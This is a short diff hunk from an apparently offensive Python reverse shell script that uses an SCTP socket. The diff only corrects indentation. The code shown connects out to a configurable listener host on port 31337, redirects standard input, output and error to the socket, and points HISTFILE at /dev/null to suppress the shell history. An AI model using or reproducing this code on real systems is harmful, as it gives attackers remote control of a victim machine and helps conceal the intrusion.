@@ -20,8 +20,8 @@ lport = 31337 # XXX: CHANGEME
 
 def main():
     s = sctpsocket_tcp(socket.AF_INET)
-	s.connect((lhost, lport))
-	os.dup2(s.fileno(),0)
+    s.connect((lhost, lport))
+    os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
     os.putenv("HISTFILE",'/dev/null')
